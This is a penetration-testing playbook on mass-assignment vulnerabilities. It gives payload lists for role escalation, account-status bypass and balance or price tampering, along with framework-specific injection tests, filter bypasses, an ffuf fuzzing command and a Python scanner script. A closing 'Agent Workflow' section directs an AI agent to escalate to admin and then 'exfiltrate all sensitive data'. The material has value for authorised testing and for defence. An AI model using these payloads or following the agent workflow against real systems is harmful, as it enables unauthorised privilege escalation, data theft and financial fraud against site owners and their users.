# Mass Assignment

> **Summary**: Mass assignment (CWE-915) occurs when an application automatically binds user-supplied input to internal model properties without an explicit allow-list, enabling attackers to modify privileged fields such as roles, permissions, or account status.
> **Impact**: Vertical privilege escalation (user to admin), horizontal privilege escalation, account takeover, financial manipulation (balance/credits/price tampering), bypassing business logic restrictions.
> **Typical Severity**: High | Critical

## Detection

### Indicators
- API endpoints that accept JSON/form data for user profile updates (`PUT /api/users/<ID>`, `PATCH /me`, `POST /api/register`)
- Response bodies that echo server-managed fields not present in the original request (e.g., `roles`, `isAdmin`, `status`, `verified`, `permissions`)
- Client-side JavaScript bundles containing role names, permission constants, or DTO/model schemas
- API documentation (Swagger/OpenAPI) exposing internal model properties
- Frameworks known for auto-binding: Rails, Laravel, Django, Spring Boot, Express/Mongoose, Sequelize

### Automated Detection

#### Param Miner (Burp Suite)
```
Right-click request -> Extensions -> Param Miner -> Guess body params
```

#### Arjun -- Parameter Discovery
```bash
arjun -u https://<TARGET>/api/users/<ID> -m PUT -o params.json
```

#### Manual Grep on JS Bundles
```bash
# Download and search client JS for model/role hints
curl -s https://<TARGET>/static/js/app.js | grep -iE "role|admin|isAdmin|permission|status|verified|balance|credits" | sort -u
```

### Manual Detection
1. **Baseline request**: send a normal update with only safe fields and observe the full JSON response structure
   ```http
   PUT /api/users/<YOUR_ID> HTTP/1.1
   Host: <TARGET>
   Content-Type: application/json
   Authorization: Bearer <TOKEN>

   {"firstName": "Test", "lastName": "User"}
   ```
2. **Inspect response**: look for fields you did not send -- `roles`, `isAdmin`, `status`, `verified`, `balance`, `organization_id`, `permissions`
3. **Inject privileged field**: repeat the request including a discovered privileged field
   ```http
   PUT /api/users/<YOUR_ID> HTTP/1.1
   Host: <TARGET>
   Content-Type: application/json
   Authorization: Bearer <TOKEN>

   {"firstName": "Test", "lastName": "User", "role": "admin"}
   ```
4. **Success criteria**: if the response persists the change (field value updated), mass assignment is confirmed
5. **Compare GET vs PUT/POST**: compare fields returned by `GET /api/users/<ID>` with the fields accepted in `PUT`/`POST` bodies -- any overlap with privileged fields is a target

## Exploitation

### Prerequisites
- An authenticated account on the target application
- Identified endpoints that accept user input for object creation or update
- Knowledge of internal model properties (from response inspection, JS bundles, API docs, or guessing)

### Step-by-Step

1. **Enumerate the schema** -- Send a legitimate update and inspect the full response to map all properties of the model
   - **Success criteria**: response contains fields beyond what you submitted (e.g., `roles: null`, `isAdmin: false`)

2. **Identify candidate fields** -- Test common privileged parameter names one at a time:
   - `role`, `roles`, `isAdmin`, `is_admin`, `admin`, `is_staff`, `userType`, `user_type`
   - `verified`, `email_verified`, `is_verified`, `active`, `is_active`, `status`
   - `balance`, `credits`, `discount`, `price`, `amount`
   - `user_id`, `organization_id`, `tenant_id`, `group_id`
   - `permissions`, `scope`, `entitlements`, `features`
   - **Success criteria**: server accepts the field without returning a 400/422 error

3. **Escalate privileges** -- Inject the confirmed privileged field with the desired value:
   ```http
   PUT /api/users/<YOUR_ID> HTTP/1.1
   Host: <TARGET>
   Content-Type: application/json
   Authorization: Bearer <TOKEN>

   {
     "firstName": "Test",
     "roles": [{"id": 1, "name": "ADMIN"}]
   }
   ```
   - **Success criteria**: response confirms the role change; re-authenticate or refresh token to confirm elevated access

4. **Verify escalation** -- Access admin-only endpoints or UI sections after re-authentication
   - **Success criteria**: previously forbidden resources (403) now return 200

### Payloads

#### Role Escalation
```json
{"role": "admin"}
{"roles": ["admin"]}
{"roles": [{"id": 1, "name": "ADMIN"}]}
{"isAdmin": true}
{"is_admin": true}
{"is_staff": true}
{"userType": "administrator"}
{"permissions": ["*"]}
{"access_level": 9999}
```

#### Account Status Manipulation
```json
{"verified": true}
{"email_verified": true}
{"is_active": true}
{"status": "ACTIVATED"}
{"account_status": "premium"}
```

#### Financial Manipulation
```json
{"balance": 99999}
{"credits": 99999}
{"discount": 100}
{"price": 0}
{"amount": 0.01}
```

#### IDOR via Mass Assignment
```json
{"user_id": "<VICTIM_ID>"}
{"organization_id": "<TARGET_ORG_ID>"}
{"owner_id": "<ATTACKER_ID>"}
{"tenant_id": "<OTHER_TENANT>"}
```

#### Nested Object Injection
```json
{"user": {"role": "admin"}}
{"profile": {"is_admin": true}}
{"account": {"balance": 99999, "verified": true}}
```

#### Array Parameter Injection
```json
{"roles": ["user", "admin"]}
{"permissions": ["read", "write", "delete", "admin"]}
```

#### JSON vs Form-Data Differences
Some backends parse `application/json` and `application/x-www-form-urlencoded` differently. Test both:
```
# Form-encoded
role=admin&verified=true

# JSON
{"role": "admin", "verified": true}

# Nested form-encoded (PHP/Rails)
user[role]=admin
user[is_admin]=true
```

### Exploitation by Framework

#### Ruby on Rails
- Vulnerable when `params[:user]` is passed directly to `update` or `create` without strong parameters
- Test: add `admin=true` or `role=admin` to the request body
- Legacy apps using `attr_accessible` (pre-Rails 4) instead of `strong_parameters` are especially vulnerable
```
# Rails strong params bypass attempt -- try dot notation
user.admin=true
user[admin]=true
```

#### Node.js / Express (Mongoose/Sequelize)
- Vulnerable when `req.body` is passed directly to `Model.findByIdAndUpdate()` or `Model.create()`
- Test: include `isAdmin`, `role`, or `verified` in JSON body
```json
{"username": "test", "isAdmin": true}
```

#### Django / Python
- Vulnerable when using `ModelForm` without explicit `fields` or `exclude` definitions
- Test: add model fields not exposed in the form (e.g., `is_staff`, `is_superuser`)
```json
{"username": "test", "is_staff": true, "is_superuser": true}
```

#### Java / Spring Boot
- Vulnerable when `@RequestBody` maps directly to JPA entity without a DTO
- Test: include entity fields like `roles`, `enabled`, `authorities`
```json
{"username": "test", "authorities": [{"authority": "ROLE_ADMIN"}]}
```

#### PHP / Laravel (Eloquent)
- Vulnerable when `$guarded = []` (empty guarded array) or `$fillable` includes privileged fields
- Test: submit fields like `is_admin`, `role`, `email_verified_at`
```json
{"name": "test", "is_admin": 1, "email_verified_at": "2024-01-01 00:00:00"}
```

### Proof of Concept

#### Automated Parameter Fuzzing with ffuf
```bash
# Generate a wordlist of common privileged parameters
cat << 'EOF' > mass-assign-params.txt
role
roles
isAdmin
is_admin
admin
is_staff
userType
verified
email_verified
is_active
status
balance
credits
discount
permissions
organization_id
user_id
owner_id
EOF

# Fuzz each parameter name against the update endpoint
ffuf -u https://<TARGET>/api/users/<ID> \
  -X PUT \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"firstName":"Test","FUZZ":true}' \
  -w mass-assign-params.txt \
  -fc 400,422 \
  -mc all
```

#### Python Script -- Automated Mass Assignment Test
```python
import requests

url = "https://<TARGET>/api/users/<YOUR_ID>"
headers = {
    "Authorization": "Bearer <TOKEN>",
    "Content-Type": "application/json"
}

params_to_test = [
    {"role": "admin"}, {"isAdmin": True}, {"is_admin": True},
    {"is_staff": True}, {"verified": True}, {"status": "ACTIVATED"},
    {"balance": 99999}, {"permissions": ["admin"]},
    {"user_type": "administrator"}, {"email_verified": True}
]

for param in params_to_test:
    payload = {"firstName": "Test"}
    payload.update(param)
    r = requests.put(url, json=payload, headers=headers)
    key = list(param.keys())[0]
    if r.status_code == 200 and key in r.text:
        print(f"[+] Potentially vulnerable to: {param}")
        print(f"    Response: {r.text[:200]}")
```

## Bypasses

- **Content-Type switching**: if `application/json` is blocked, try `application/x-www-form-urlencoded` or `multipart/form-data`
- **Nested parameters**: `{"user": {"role": "admin"}}` instead of `{"role": "admin"}`
- **Dot notation**: `user.role=admin` in form-encoded requests
- **Array wrapping**: `{"role": ["admin"]}` instead of `{"role": "admin"}`
- **Different HTTP methods**: `PATCH` may bind differently than `PUT`
- **Registration endpoint**: mass assignment on `/api/register` or `/api/signup` is often less protected than `/api/users/<ID>`
- **Alternate endpoints**: try legacy or versioned endpoints (`/v1/users/<ID>`, `/api/internal/users/<ID>`)
- **Case variation**: `isAdmin` vs `is_admin` vs `IsAdmin` vs `ISADMIN`
- **Type juggling**: send `"true"` (string), `1` (integer), `"1"` (string), `true` (boolean) for boolean fields
- **Merge via PUT vs PATCH**: PUT often replaces the entire object (including defaults); PATCH only updates sent fields -- test both
- **Batch/bulk endpoints**: `/api/users/bulk-update` may skip per-field validation

## Escalation

- Chain with [IDOR](idor.md): use mass assignment to change `owner_id` or `organization_id` to access other users' resources
- Chain with [Parameter Pollution](parameter-pollution.md): combine duplicate parameters with mass assignment for filter bypass
- Chain with registration flows: inject `role=admin` during account creation to get immediate admin access (see [Registration Vulns](../authentication/registration-vulns.md))
- **Token refresh**: after successful role escalation, re-authenticate to obtain a new session/JWT with elevated claims
- **Data exfiltration**: after escalating to admin, access admin-only API endpoints to extract sensitive data
- **Financial fraud**: manipulate `balance`, `credits`, or `price` fields for monetary gain

## Tools

| Tool | Usage |
|------|-------|
| [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Burp extension: brute-force hidden parameters in request bodies |
| [Arjun](https://github.com/s0md3v/Arjun) | CLI parameter discovery across GET/POST/PUT/PATCH |
| [ffuf](https://github.com/ffuf/ffuf) | Fast fuzzer for parameter name brute-forcing |
| Burp Intruder | Fuzz parameter names and values against update endpoints |
| [mass-assignment-scanner](https://github.com/BishopFox/mass-assignment-scanner) | Automated mass assignment vulnerability scanner |
| Browser DevTools | Inspect JS bundles for model schemas and role constants |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for mass assignment vulnerabilities.

### Phase 1: Discovery
1. Identify all API endpoints that accept user input for object creation or update (`POST /api/register`, `PUT /api/users/<ID>`, `PATCH /api/me`, `POST /api/settings`).
2. Send a legitimate GET request to each resource endpoint and record the full response body -- note every field returned (especially `role`, `isAdmin`, `verified`, `balance`, `permissions`, `status`, `organization_id`).
3. Send a legitimate update request with only safe fields (e.g., `{"firstName":"Test"}`) and compare the response fields with the GET response.
4. Search client-side JavaScript bundles for model schemas, role names, and permission constants:
   ```bash
   curl -s https://<TARGET>/static/js/app.js | grep -iE "role|admin|isAdmin|permission|status|verified|balance|credits"
   ```
5. Check API documentation (Swagger/OpenAPI) for internal model properties.

### Phase 2: Validation
1. For each endpoint, add one hidden/privileged parameter at a time to the request body and observe the response:
   - Test: `{"firstName":"Test","role":"admin"}` -- does the server accept it without error (no 400/422)?
   - Test: `{"firstName":"Test","isAdmin":true}` -- does the response reflect the change?
   - Test: `{"firstName":"Test","verified":true}` -- does the field persist?
2. Iterate through common privileged parameter names:
   `role`, `roles`, `isAdmin`, `is_admin`, `admin`, `is_staff`, `userType`, `verified`, `email_verified`, `is_active`, `status`, `balance`, `credits`, `discount`, `permissions`, `organization_id`, `user_id`, `owner_id`.
3. Test different Content-Types: `application/json`, `application/x-www-form-urlencoded`, `multipart/form-data`.
4. Test nested object injection: `{"user":{"role":"admin"}}`, `{"profile":{"is_admin":true}}`.
5. A parameter is confirmed vulnerable if the server accepts and persists the change.

### Phase 3: Exploitation
1. Inject the confirmed privileged field with the escalation value:
   ```http
   PUT /api/users/<YOUR_ID>
   {"firstName":"Test","roles":[{"id":1,"name":"ADMIN"}]}
   ```
2. Re-authenticate or refresh your token to obtain a new session with elevated claims.
3. Access admin-only endpoints or UI sections (e.g., `GET /api/admin/users`, `GET /admin/dashboard`).
4. For financial manipulation, set `{"balance":99999}` or `{"price":0}` and verify the change persists.
5. For account status bypass, set `{"email_verified":true}` or `{"status":"ACTIVATED"}`.

### Phase 4: Escalation
1. Chain with IDOR: use mass assignment to change `owner_id` or `organization_id` to access other users' resources.
2. After role escalation to admin, enumerate and exfiltrate all sensitive data from admin-only API endpoints.
3. Test bulk/batch endpoints (`/api/users/bulk-update`) which may skip per-field validation.
4. Test the registration endpoint (`/api/register`) -- mass assignment during account creation is often less protected.
5. Document financial impact if `balance`, `credits`, or `price` fields were modifiable.

## Decision Tree

```
Start: Identify endpoints accepting user input for create/update
  |
  +---> GET response reveals hidden fields (role, isAdmin, balance)?
  |       +---> Yes: Test each hidden field as an injection target
  |       +---> No: Fuzz with common privileged parameter names
  |
  +---> Server accepts privileged parameter without error?
  |       +---> Yes: Check if value persists (re-fetch the resource)
  |       |       +---> Persists: Role escalation? --> Promote to admin
  |       |       +---> Persists: Email verified bypass? --> Skip verification
  |       |       +---> Persists: Balance manipulation? --> Financial fraud
  |       +---> No (400/422): Try nested object, different Content-Type, alternate endpoints
  |
  +---> Flat params rejected?
          +---> Try nested: {"user":{"role":"admin"}}
          +---> Try array: {"roles":["admin"]}
          +---> Try dot notation: user.role=admin
          +---> Try different HTTP method: PATCH vs PUT
```

## Success Criteria
- [ ] Hidden/privileged fields discovered in API responses that are not part of the normal user-facing input
- [ ] At least one privileged parameter accepted and persisted by the server
- [ ] Privilege escalation confirmed: previously forbidden resources (403) now return 200 after role change
- [ ] If financial fields: unauthorized balance/credit/price modification confirmed
- [ ] If chaining with IDOR: access to other users' resources via modified `owner_id` or `organization_id`

## References
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [OWASP API Security - API6:2023 Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/)
- [PortSwigger - Mass Assignment Vulnerabilities](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)
- [HackTricks - Mass Assignment](https://book.hacktricks.wiki/en/pentesting-web/mass-assignment-cwe-915.html)
- [FIA Driver Categorisation: Admin Takeover via Mass Assignment (Ian Sh)](https://ian.sh/fia)
